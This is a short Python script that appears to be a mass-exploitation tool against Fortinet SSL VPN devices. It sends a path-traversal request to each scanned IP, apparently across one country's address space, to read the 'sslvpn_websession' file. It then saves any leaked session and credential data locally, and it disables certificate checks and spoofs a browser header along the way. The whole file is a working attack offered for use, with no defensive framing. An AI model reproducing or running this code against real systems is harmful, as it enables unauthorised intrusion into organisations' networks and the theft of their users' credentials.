from spike import ScanIP
import requests,os

if not os.path.isdir("Results"):
    os.mkdir('Results')
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def exploit(ip: str)->None:
    try:
        response = requests.get(f'https://{ip}:10433/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession', stream=True, timeout=2,verify=False, headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"}, allow_redirects=False)
        if response.status_code == 200 and "var fgt_lang = " in response.text:
            print(f'\n[+] good ->> {ip}')
            img=response.content
            with open(f'Results\\{ip}.bin', 'wb') as f:
                f.write(img)
        else:
            print("\nskip..")
    except Exception as error:
        pass


if __name__ == "__main__":
    s = ScanIP("pk")
    s.scan(exploit)